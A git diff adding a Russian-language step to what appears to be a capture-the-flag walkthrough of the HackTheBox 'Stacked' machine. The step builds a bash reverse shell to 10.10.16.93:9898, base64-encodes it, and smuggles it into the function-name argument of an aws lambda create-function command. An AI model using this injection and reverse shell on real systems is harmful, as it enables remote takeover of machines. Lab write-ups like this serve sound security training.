@@ -210,3 +210,18 @@ $ aws lambda --endpoint=http://s3-testing.stacked.htb create-function --function
 ![](../.gitbook/assets/13.png)
 
 ![](../.gitbook/assets/14.png)
+
+Теперь можно прокинуть реверс шелл. Заворачиваем его в base64, чтобы не было никаких проблем при передаче:
+
+```
+$ echo -n "bash -i >& /dev/tcp/10.10.16.93/9898 0>&1" | base64
+```
+
+Флаг -n в команде echo позволяет избавиться от переноса строки, т.е. \n.
+
+В итоге у нас должно получить что-то такое:
+
+```
+$ aws lambda --endpoint=http://s3-testing.stacked.htb create-function --function-name 'func1;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45My85ODk4IDA+JjE=|base64 -d|bash' --role user --handler index.handler --runtime nodejs10.x --zip-file fileb://index.zip
+```
+
